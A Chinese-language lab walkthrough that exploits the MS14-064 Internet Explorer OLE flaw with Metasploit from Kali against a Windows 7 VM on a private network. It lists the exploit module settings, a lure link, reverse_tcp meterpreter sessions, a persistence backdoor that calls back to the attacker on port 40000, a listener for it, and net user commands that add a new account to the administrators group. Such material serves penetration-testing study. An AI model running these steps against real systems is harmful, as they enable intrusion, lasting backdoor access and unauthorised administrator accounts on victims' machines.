> **本实验实现1：** 利用MS14-064漏洞，会生成一个网址，诱导用户点击，打开后，会直接连接到发起攻击的主机上，即可攻击成功。
>
>  **本实验实现2：**
> 一旦入侵成功，则拿到控制目标主机的部分权限，后通过persistence，在目标主机上生成一个固定的后门程序，以便后续不再通过MS14-064漏洞进行二次入侵，而是通过这个后门文件来入侵该主机。在向目标主机成功植入后门后，进行验证，重新通过已植入的后门程序，二次入侵目标主机，最终攻击成功。
>
>  **本实验实现3：** 在kali控制win7后，实现创建用户的操作。

在VMware上建立两个虚拟机：win7和kali。

Kali：它是Linux发行版的操作系统，它拥有超过300个渗透测试工具，就不用自己再去找安装包，去安装到我们自己的电脑上了，毕竟自己从网上找到，也不安全。它甚至还集成了600多种黑客工具，很强大。

可以永久免费使用，基本上学黑客攻击必会用到这个系统。

靶机：Win7 64位 （IP: 192.168.10.45）--用ipconfig进行查询。

![1671014899_6399a9f3e5553e6d0794d.png!small?1671014900857](https://image.3001.net/images/20221214/1671014899_6399a9f3e5553e6d0794d.png!small?1671014900857)

攻击机：Kali （IP：192.168.10.21）--用ifconfig进行查询。

![1671004120_63997fd81cc3be5b118c7.png!small?1671004121622](https://image.3001.net/images/20221214/1671004120_63997fd81cc3be5b118c7.png!small?1671004121622)

###  **1** **、实验环境前提条件**

win7中，关闭防火墙（“打开网络和共享中心”-“Windows防火墙”-“打开或关闭Windows防火墙”-均选择关闭选项）。

保证两个虚拟机是可以ping通的（尤其是在kali中去ping win7，看能否连通）。

    
    
    $ping 192.168.10.45

###
![1671014963_6399aa334142a7dcbbd93.png!small?1671014964866](https://image.3001.net/images/20221214/1671014963_6399aa334142a7dcbbd93.png!small?1671014964866)

###  **2** **、打开** **Metasploit** **渗透工具**

Metasploit是一款开源的安全漏洞检测工具，msfconsole用于启动msf终端：

    
    
    >msfconsole

 **结果：** 成功进入，进入到"msf6>“的模式下

![1669884976_63886c300ba3ce8ddedfa.png!small?1669884977752](https://image.3001.net/images/20221201/1669884976_63886c300ba3ce8ddedfa.png!small?1669884977752)

###  **3** **、查看需要利用的漏洞**

搜索漏洞，编号为MS14-064。

MS14-064为Windows
OLE自动化阵列远程代码执行漏洞。当IE不作访问内存中的对象时，存在远程代码执行漏洞。OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术，远程攻击者利用此漏洞通过构造的网站执行任意代码，用户使用IE浏览器查看该网站时允许远程执行代码。

【 **补充** ：Windows系统漏洞微软的漏洞编号命名格式为：MS14-064；

MS Micosoft的缩写，固定格式；  
14 表示年份，即2014年发布的漏洞；  
064 表示顺序，即当年度发布的第64个漏洞。

    
    
    >search ms14-064

 **结果：** 可以看到返回了多条可利用的漏洞模块信息

![1671004421_63998105e066d3b5cd87b.png!small?1671004423990](https://image.3001.net/images/20221214/1671004421_63998105e066d3b5cd87b.png!small?1671004423990)

### 4、尝试利用其中一个漏洞模块进行攻击

利用其中一个漏洞攻击模块-0模块，进行攻击，进入模块中（ **注意** ：必须是“_”，不是“-”，否则会报错）。

    
    
    >use exploit/windows/browser/ms14_064_ole_code_execution

 **结果：** 成功切换到这个模块之下--”msf6
exploit(windows/browser/ms14_064_ole_code_execution)>“

并提示“no payload configured,defaulting to
windows/meterpreter/reverse_tcp”--没有配置payload，默认为
windows/meterpreter/reverse_tcp

![1671004493_6399814da491539fc255c.png!small?1671004494989](https://image.3001.net/images/20221214/1671004493_6399814da491539fc255c.png!small?1671004494989)

### 5、查看该漏洞模块所需的参数情况

进到这个漏洞模块之后，先查看该测试模块的参数情况。类似于你使用一软件，进行攻击，是不是需要先进行一些简单的参数配置啊，需要告诉软件，要向谁发起攻击吧，这是最最基本的，所以，要配置，就要先查看都可以配置哪些参数。

    
    
    >show options

 **结果：** 其中required显示的值为yes的，代表是必须要设置的项；显示的值为no的，代表是不必须要设置的项；

重点关注6个参数配置，需要设置哪个就设置哪个：

> Payload (攻击载体-使用默认的windows/meterpreter/reverse_tcp即可) ；
>
> SRVHOST (文件共享服务器-kali地址)；
>
> SRVPORT (文件共享服务器的端口-使用默认获取的端口即可)；
>
> LHOST (发起攻击的地址-kali地址)；
>
> LPORT (发起攻击的端口-使用默认获取的端口即可)；
>
> AllowPowershellPrompt (开启浏览器插件，默认为false）

![1671004621_639981cda0435fda74036.png!small?1671004623253](https://image.3001.net/images/20221214/1671004621_639981cda0435fda74036.png!small?1671004623253)

![1671004724_63998234e05adc227119b.png!small?1671004726334](https://image.3001.net/images/20221214/1671004724_63998234e05adc227119b.png!small?1671004726334)

【 **补充说明：**

1）Payload中包含有需要在远程系统中运行的恶意代码，Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。也就是说，漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。

2）Payload模块主要有以下三种类型：-Single -Stager -Stage

> Single是一种完全独立的Payload，实现的目的也简单，但容易被捕捉到。
>
> Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。 一种常见的Stagers
> Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接（3次握手-4次挥手）（是一个基于TCP的反向链接反弹shell,
> 使用起来很稳定）。
>
> Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。

3）windows/x64/meterpreter/reverse_tcp则由一个Stager Payload（reverse_tcp）和一个Stage
Payload（meterpreter）组成。

 **注意：** **Payload** **为** **windows/meterpreter/reverse_tcp** **默认获取到的控制通道**
**meterpreter** **为** **32** **位，**

 **如果想将之后获取到的控制通道** **meterpreter** **改为** **64** **位，则设置。**
**payload:windows/x64/meterpreter/reverse_tcp**

 **】**

###  **6、设置文件共享服务器**

发现SRVHOST为空，待设置，其它（payload/SRVPORT/LHOST/LPORT）均已获取，且正确，设置SRVHOST的对应的参数地址，它指的是文件共享服务器的地址，想一想，要设成谁？为什么？

分析一下：是在哪里用到这个文件共享服务器？是不是会在生成一个网址，诱导用户点击了，就会直接连接到发起攻击的主机上。那你们觉得应该是谁生成这个连接呢？是用户那边么？还是攻击者这边？肯定是攻击者这边吧，我们是不知道会有谁点了这个网站链接吧。

所以，我们才会对这个文件共享服务器的地址设置为kali的地址

    
    
    >set SRVHOST 192.168.10.21

![1671004816_63998290e505ee41e0b65.png!small?1671004818277](https://image.3001.net/images/20221214/1671004816_63998290e505ee41e0b65.png!small?1671004818277)

###  **7、开启浏览器插件**

要把AllowPowershellPrompt的默认参数false改为true，因为msf中自带的漏洞是利用exp调用的是powershell（powershell是一种命令外壳程序和脚本环境），所以msf的exp代码只对安装了powershell的系统生效。

    
    
    >set AllowPowershellPrompt true

![1671004876_639982ccb5e76e0eeab4d.png!small?1671004877961](https://image.3001.net/images/20221214/1671004876_639982ccb5e76e0eeab4d.png!small?1671004877961)

###  **8、再次进行检查**

查看对SRVHOST和AllowPowershellPrompt进行的修改，是否修改成功

    
    
    >show options

![1671004976_639983303cc9d68898d4f.png!small?1671004977735](https://image.3001.net/images/20221214/1671004976_639983303cc9d68898d4f.png!small?1671004977735)

###  **9、检查无误后，发起攻击**

    
    
    >run

 **结果：** 生成一个网站的链接“Using URL :
[http://192.168.10.21:8080/xE6RxjSy](http://192.168.10.21/%E2%80%9D%EF%BC%8C%E5%BC%80)，开启服务，光标停留在这，等待有人点击该网站链接。

![1671015109_6399aac5871e926f0195d.png!small?1671015111082](https://image.3001.net/images/20221214/1671015109_6399aac5871e926f0195d.png!small?1671015111082)

### 10、打开网站链接

到win7中，在IE浏览器中打开网站链接：
[http://192.168.10.21:8080/xE6RxjSy](http://192.168.10.21/%E2%80%9D%EF%BC%8C%E5%BC%80)，会提示是否允许打开一个文件，选择“允许”之后，即可触发会话连接。

【 **注意：** 与MS10-046的反馈结果有所不同，详情可参考我的另一篇文章《钓鱼网站+bypassuac提权》】

![1671015222_6399ab36602cdde7c2fbd.png!small?1671015223553](https://image.3001.net/images/20221214/1671015222_6399ab36602cdde7c2fbd.png!small?1671015223553)

 **结果1：** 在win7中打开链接后，不会有任何的反馈结果。

![1671015236_6399ab44e9bc2b61ea681.png!small?1671015237975](https://image.3001.net/images/20221214/1671015236_6399ab44e9bc2b61ea681.png!small?1671015237975)

 **结果2：**
由于在win7中触发打开了网址链接，那么，在kali中，则会触发会话连接，结果显示了是192.168.10.45（目标主机win7）尝试点击了该网站链接，于是，kali利用MS14-064漏洞模块对目标主机发起了攻击，最终，“meterpreter
session 1 opened”--表明已经开通192.168.10.21:4444和192.168.10.45:49191会话连接1。

一般会自动进入控制通道meterpreter，交互模式，表明攻击成功。

![1671015293_6399ab7d17ddc86d3e4ce.png!small?1671015294414](https://image.3001.net/images/20221214/1671015293_6399ab7d17ddc86d3e4ce.png!small?1671015294414)

![1671015428_6399ac0476b0afd2b1b22.png!small?1671015429359](https://image.3001.net/images/20221214/1671015428_6399ac0476b0afd2b1b22.png!small?1671015429359)

 **注意：**

一旦开通一个会话连接后，若系统没有自动进入控制通道，则可以尝试回车，进行手动连接。

 **1）手动查看当前存在的会话**

注意在目录msf>下，手动查看当前存在的会话。

 **结果：** 当前只有会话连接1，meterpreter建立的连接类型type是x86--32位的（由模块中的payload设定），以及展示目标主机192.168.10.45的基本信息和连接信息。

    
    
    >sessions

![1671015392_6399abe0781d99356fb92.png!small?1671015393564](https://image.3001.net/images/20221214/1671015392_6399abe0781d99356fb92.png!small?1671015393564)

 **2）选择连接当前已经开通的会话1**

    
    
    >sessions -i 1

 **结果：** 成功进入控制通道meterpreter，交互模式，表明攻击成功。

![1671015408_6399abf0377be92b5a85b.png!small?1671015409255](https://image.3001.net/images/20221214/1671015408_6399abf0377be92b5a85b.png!small?1671015409255)

### 11、植入后门程序

在kali控制win7后， **通过persistence**
，在目标主机上生成一个后门程序，以便后续不再通过MS14-064漏洞进行二次入侵，而是通过这个后门文件来入侵该主机【注意在控制通道meterpreter>下】。

 **注意：** 因为这个 **MS14-064漏洞很容易被修复** ，一旦目标主机进行定期修补漏洞，那么通过MS14-064漏洞进行
**入侵的路径，就会失效** ，但 **植入的后门程序是不容易被发现和修复的** ，所以一旦入侵成功后，建议尝试植入后门程序。

 **通过persistence(支持多种方式启动)植入固定的后门程序** ，设置相关参数，设置回连地址和端口号。

    
    
    >run persistence -S -U -X -i 5 -p 40000 -r 192.168.10.21

重点关注6个参数配置：

> -S：系统启动时自动加载本程序（因为该后门程序是不能被目标用户发现，更不需要让目标主机进行点
>
> 击启动的，所以需要该程序有自动加载的功能）；
>
> -U：用户登陆时自动加载本程序；
>
> -X：开机时自动加载本程序；
>
> -i： 自动加载后，回连的时间间隔，即后门每隔多少秒尝试连接回连地址；
>
> -r： 自动加载后，回连的主机地址，回连到谁啊，自然是入侵的kali的地址；
>
> -p：自动加载后，回连的端口号，即kali地址的端口号，理论上可随意设置，但范围不要超过65535，且
>
> 不可设置为常见的特殊的端口号；

 **结果1：**
在kali中提示，成功生成一个后门程序yqLAOjt.vbs，自动加载后会回连到192.168.10.21:40000，并保存于目标主机win7中的C:\Users\18044\AppData\Local\Temp\目录下。

【 **注意：**
payload自动设置为“windows/meterpreter/reverse_tcp”，LHOST设置为192.168.10.21，LPORT设置为40000】

![1671015497_6399ac49c713127081e35.png!small?1671015499012](https://image.3001.net/images/20221214/1671015497_6399ac49c713127081e35.png!small?1671015499012)

 **结果2：**
在win7中的C:\Users\18044\AppData\Local\Temp\目录下，成功找到从攻击主机kali植入的后门程序yqLAOjt.vbs

![1671015789_6399ad6d91c9d3bdcf3ae.png!small?1671015790965](https://image.3001.net/images/20221214/1671015789_6399ad6d91c9d3bdcf3ae.png!small?1671015790965)

 **【补充知识点：**

 **1）端口号范围：0~65535**

![1669798399_638719ff3edb1751047e3.png!small?1669798400282](https://image.3001.net/images/20221130/1669798399_638719ff3edb1751047e3.png!small?1669798400282)

 **2）常见端口号列举**

![1669798422_63871a1602d8df89fbb59.png!small?1669798422938](https://image.3001.net/images/20221130/1669798422_63871a1602d8df89fbb59.png!small?1669798422938)

 **】**

### 12、 **挂起当前会话**

在成功植入后门程序后，我们还需要对该后门程序进行验证，验证是否可以通过该后门程序成功入侵目标主机win7，所以可先将当前通过MS14-064漏洞开启的会话连接挂起（background）或断开（exit），均可

    
    
    meterpreter>background

 **结果：** 成功将session会话1挂起到后台，并没有断开连接，且成功切换到msf >目录下

![1671015899_6399addb280d348928ba8.png!small?1671015900193](https://image.3001.net/images/20221214/1671015899_6399addb280d348928ba8.png!small?1671015900193)

###

###  **13、** **开启监听模块**

利用后门程序进行攻击，需要打开一个监听模块，能够反弹shell监听模块，进行攻击，进入模块中

    
    
    >use exploit/multi/handler

 **结果：** 成功切换到这个模块之下--”msf6 exploit(multi/handler)>“

并提示“Using configured payload
generic/shell_reverse_tcp”--使用的payload为generic/shell_reverse_tcp

![1671015923_6399adf34116bdcfc3b1a.png!small?1671015924268](https://image.3001.net/images/20221214/1671015923_6399adf34116bdcfc3b1a.png!small?1671015924268)

### 14、查看该监听模块所需的参数情况

进到这个监听模块之后，先查看该模块的参数情况。类似于你使用一软件，进行攻击，是不是需要先进行一些简单的参数配置啊，需要告诉软件，要向谁发起攻击吧，这是最最基本的，所以，要配置，就要先查看都可以配置哪些参数？

    
    
    >show options

 **结果：** 其中required显示的值为yes的，代表是必须要设置的项；显示的值为no的，代表是不必须要设置的项；

重点关注3个参数配置，需要设置哪个就设置哪个：

> Payload：攻击载体；
>
> LHOST：回连地址；
>
> LPORT：回连端口号；

![1671015964_6399ae1cc52c6c000e232.png!small?1671015966062](https://image.3001.net/images/20221214/1671015964_6399ae1cc52c6c000e232.png!small?1671015966062)

###  **15、设置攻击载体、回连地址以及端口号**

因为我们要开启的这个监听模块，是专门针对于yqLAOjt.vbs后门程序，进行实时监听，那么，必然需要将监听模块的参数配置，与yqLAOjt.vbs后门程序的参数配置保持一致，只有这样，才能达到准确的监听

之前制作yqLAOjt.vbs的参数为：

"run persistence -S -U -X -i 5 -p 40000 -r 192.168.10.21"

因此，我们也就需要将监听模块的攻击载体Payload，与后门程序的payload保持一致：

    
    
    >set payload windows/meterpreter/reverse_tcp

需要将监听模块的回连地址LHOST，与后门程序的LHOST保持一致：

    
    
    >set LHOST 192.168.10.21

需要将监听模块的回连地址的端口号LPORT，与后门程序的LPORT保持一致：

    
    
    >set LPORT 40000

###
![1671016063_6399ae7f8ca4b9e5349c3.png!small?1671016065130](https://image.3001.net/images/20221214/1671016063_6399ae7f8ca4b9e5349c3.png!small?1671016065130)

###  **16、再次进行检查**

    
    
    >show options

![1671016085_6399ae950801c83ac8df4.png!small?1671016087655](https://image.3001.net/images/20221214/1671016085_6399ae950801c83ac8df4.png!small?1671016087655)

###  **17、检查无误后，发起攻击**

    
    
    >run

 **结果：**
开启针对192.168.10.21:40000的监听模式，因为yqLAOjt.vbs后门程序已经设置了自动加载，所以一旦开启监听模块，立即会有反馈信息回连到192.168.10.21:40000上来。

最终，“meterpreter session 2
opened”--表明已经开通192.168.10.21:40000和192.168.10.45:49227的会话连接2。

一般会自动进入控制通道meterpreter，交互模式，表明攻击成功。

![1671016150_6399aed681db616792619.png!small?1671016151696](https://image.3001.net/images/20221214/1671016150_6399aed681db616792619.png!small?1671016151696)

【 **注意：**

此时，将当前开启的会话进行挂起操作--background，再查看当前已存在的会话--sessions，结果会得到已开启两个会话连接信息，要对这两个会话连接进行区分，分清楚，
**第一个会话连接是通过MS14-064漏洞开启的，第二个会话连接是通过后门程序开启的**

![1671016233_6399af29d27701bf50826.png!small?1671016234967](https://image.3001.net/images/20221214/1671016233_6399af29d27701bf50826.png!small?1671016234967)

】

### 18、创建用户、设置密码

1）拿到shell权限，获得控制台权限，可以获取系统的控制台C:\Windows\system32

    
    
    meterpreter>shell

![1671016341_6399af95526b9e592694e.png!small?1671016342580](https://image.3001.net/images/20221214/1671016341_6399af95526b9e592694e.png!small?1671016342580)

2）进入后，可能会有乱码的情况，解决乱码问题

    
    
    C:\Windows\system32>chcp 65001

![1671016398_6399afce7b1a166c41115.png!small?1671016400239](https://image.3001.net/images/20221214/1671016398_6399afce7b1a166c41115.png!small?1671016400239)

![1671016426_6399afea5e3811addc7b0.png!small?1671016427417](https://image.3001.net/images/20221214/1671016426_6399afea5e3811addc7b0.png!small?1671016427417)

![1671016445_6399affd624e8b5a5224a.png!small?1671016446493](https://image.3001.net/images/20221214/1671016445_6399affd624e8b5a5224a.png!small?1671016446493)

3）显示win7系统中所有的用户

    
    
    C:\Windows\system32>net user

![1671016445_6399affd624e8b5a5224a.png!small](https://image.3001.net/images/20221214/1671016445_6399affd624e8b5a5224a.png!small)

4）创建用户

创建用户，用户名为test，密码为test【net user 用户名 密码 /add】

    
    
    C:\Windows\system32>net user test test /add

也可以不设置密码，只创建用户名为test1的无密码用户【net user 用户名 /add】

    
    
    C:\Windows\system32>net user test1 /add

 **结果1：** 在kali中，若结果显示“the commad completed successfully”—代表“命令执行成功” ，用户创建成功 ；

若结果显示“system error 5 has occurred；access is denied”—“发生系统错误5;
拒绝访问”-----代表权限不够的问题，需要 **进行提权，可以利用** **bypassuac** **或者Windows内核漏洞进行提权，**
具体操作可以参考我的另外两篇文章《钓鱼网站+bypassuac提权》《木马程序攻击+利用Windows内核漏洞提权》

![1671016525_6399b04d05169ebe395e3.png!small?1671016526364](https://image.3001.net/images/20221214/1671016525_6399b04d05169ebe395e3.png!small?1671016526364)

![1671016537_6399b0596a303fcc20e0f.png!small?1671016538401](https://image.3001.net/images/20221214/1671016537_6399b0596a303fcc20e0f.png!small?1671016538401)

![1671016552_6399b06876f7e8ccb4625.png!small?1671016553524](https://image.3001.net/images/20221214/1671016552_6399b06876f7e8ccb4625.png!small?1671016553524)

 **结果2：** 在win7中，”控制面板“---”添加或删除用户账户“，查看成功新建的用户test（标准用户--密码保护）、test1（标准用户--无密码）

![1671016601_6399b09921c29a6132c92.png!small?1671016602554](https://image.3001.net/images/20221214/1671016601_6399b09921c29a6132c92.png!small?1671016602554)

5）将新用户添加到administrator分组--提升到管理员权限【net localgroup administrators 用户名 /add】

    
    
    C:\Windows\system32>net localgroup administrators test1 /add

 **结果1：** 在kali中，显示“the commad completed successfully”—代表“命令执行成功”
，成功添加到administrator分组，提升管理员权限成功 ；

![1671016765_6399b13d8494c0ef58736.png!small?1671016766705](https://image.3001.net/images/20221214/1671016765_6399b13d8494c0ef58736.png!small?1671016766705)

 **结果2：** 在win7中，”控制面板“---”添加或删除用户账户“，查看新建的用户test1用户由之前的”标准用户“提升至”管理员“，提升权限成功。

![1671017008_6399b2300b7e0be5d43dc.png!small?1671017009120](https://image.3001.net/images/20221214/1671017008_6399b2300b7e0be5d43dc.png!small?1671017009120)

  

  

